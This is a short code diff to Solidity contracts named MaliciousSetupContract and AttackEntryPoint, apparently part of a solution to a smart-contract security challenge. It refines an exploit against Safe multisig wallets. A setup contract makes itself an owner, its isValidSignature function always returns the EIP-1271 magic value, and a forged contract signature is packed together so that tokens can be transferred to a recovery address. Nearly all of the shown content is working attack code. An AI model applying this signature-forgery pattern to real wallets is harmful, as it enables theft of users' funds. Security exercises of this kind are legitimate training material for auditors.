@@ -103,7 +103,7 @@ contract MaliciousSetupContract is Safe, ISignatureValidator {
         owners[fakeOwner] = address(0xBEEF);
     }
 
-    function isValidSignature(bytes memory _data, bytes memory _signature) public view override returns (bytes4) {
+    function isValidSignature(bytes memory, bytes memory) public pure override returns (bytes4) {
         return EIP1271_MAGIC_VALUE;
     }
 }
@@ -152,18 +152,6 @@ contract AttackEntryPoint {
             require(safe.isOwner(address(setupContract)), "fakeOwner must become an owner");
             bytes memory tokenTransferData = abi.encodeWithSelector(IERC20.transfer.selector, recovery, 10e18);
 
-            // bytes32 txHash = safe.getTransactionHash(
-            //     address(walletRegistry.token()), // to,
-            //     0, // value
-            //     tokenTransferData,
-            //     Enum.Operation.Call,
-            //     gasleft(), // safeTxGas,
-            //     baseGas,
-            //     gasPrice,
-            //     gasToken,
-            //     refundReceiver,
-            //     0 // nonce
-            // );
             bytes memory txSig = abi.encodePacked(
                 bytes32(uint256(uint160(address(setupContract)))), bytes32(uint256(65)), uint8(0), // actual signature
                 bytes32(""), bytes32(""), uint8(0) // dummy value to increase the length
